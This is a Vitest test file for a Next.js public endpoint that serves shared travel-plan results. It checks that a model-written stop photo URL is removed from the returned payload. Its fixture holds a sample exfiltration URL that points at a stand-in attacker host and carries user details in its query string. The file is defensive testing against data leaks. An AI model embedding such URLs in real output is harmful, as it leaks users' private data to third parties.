import { describe, it, expect, vi } from 'vitest'
import { NextRequest } from 'next/server'

// Gate 2 F-A-pub (TP9) — the public JSON endpoint, tested as a ROUTE: the real handler and the real loader, with only the admin client
// (a stored old snapshot) and the rate limiter mocked. The response must not carry the model-written stop photo; everything else of the
// frozen payload comes back as stored.

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh_budget200k'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const stored = {
  id: 'id-1', slug: 'AbCdEfGh12', query: 'q', domain: 'travel', locale: 'vi', og_version: 3, view_count: 0, ask_count: 0,
  created_at: '2026-10-01T00:00:00.000Z', parent_id: null, owner_is_anonymous: false,
  payload: {
    v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [], images: [], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
    plan: { type: 'trip', title: 'Đà Lạt 2 ngày', days: [{ label: 'Ngày 1', items: [{ time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', photo_url: EXFIL }, { time: '10:00', emoji: '🏞️', category: 'attraction', name: 'Hồ', photo_url: TBN }] }] },
  },
}
vi.mock('@/lib/supabase/admin', () => ({
  createAdminClient: () => {
    const chain = { select: () => chain, eq: () => chain, maybeSingle: async () => ({ data: JSON.parse(JSON.stringify(stored)), error: null }) }
    return { from: () => chain }
  },
}))
vi.mock('@/lib/security/publicRateLimit', () => ({
  publicDailyRateLimit: async () => ({ ok: true, retryAfter: 0, scope: 'instance' }),
  publicRateLimit: async () => ({ ok: true, retryAfter: 0, scope: 'instance' }),
}))

import { GET } from './route'

const req = (url: string) => new NextRequest(new Request(`https://www.tappyai.com${url}`), {})

describe('F-A-pub · GET /api/shared-results/[slug] (TP9)', () => {
  it('returns the frozen payload without the unlisted stop photo; every other field as stored', async () => {
    const res = await GET(req('/api/shared-results/AbCdEfGh12'), { params: { slug: 'AbCdEfGh12' } })
    expect(res.status).toBe(200)
    const body = await res.json()
    expect(JSON.stringify(body)).not.toContain('attacker.example')
    const expected = JSON.parse(JSON.stringify(stored.payload))
    delete expected.plan.days[0].items[0].photo_url
    expect(body.payload).toEqual(expected)
    expect(body.payload.plan.days[0].items[1].photo_url).toBe(TBN)
    expect(body.slug).toBe('AbCdEfGh12')
    expect(body.og_version).toBe(3)
  })
})
